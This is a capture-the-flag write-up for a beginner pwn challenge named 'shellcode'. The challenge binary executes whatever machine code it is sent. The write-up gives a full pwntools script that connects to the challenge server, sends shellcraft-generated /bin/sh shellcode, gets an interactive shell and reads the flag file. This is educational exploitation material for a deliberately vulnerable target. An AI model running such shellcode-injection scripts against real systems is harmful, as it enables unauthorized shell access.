# Access Denied: Pwn/shellcode

## Question 

Beginner code.

server: nc 34.134.85.196 5337

[shellcode](shellcode)


## Solution

No real suprise here. The program executes the shellcode we give it. So we'll ask it to execute ``asm(shellcraft.sh())`` to give us a shell.

```python
from pwn import *

binary = args.BIN
context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('34.134.85.196',5337)
    else:
        return process(e.path)


p = start()
shell = asm(shellcraft.sh())
p.sendline(shell)
p.interactive()

```

Running our script yields the flag 

```
$ python3 pwn-shell.py BIN=./shellcode REMOTE
[*] '/root/workspace/access_denied/shellcode/shellcode'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[*] Loading gadgets for '/root/workspace/access_denied/shellcode/shellcode'
[+] Opening connection to 34.134.85.196 on port 5337: Done
[*] Switching to interactive mode
This only understands the machine code so you have to give only the machine code, so please enter the machine code below
$ cat flag.txt
accessdenied{3x3cut3d_x64_sh3ll_0v3rfl0w_5ucc3ssfully_611a1501}
```

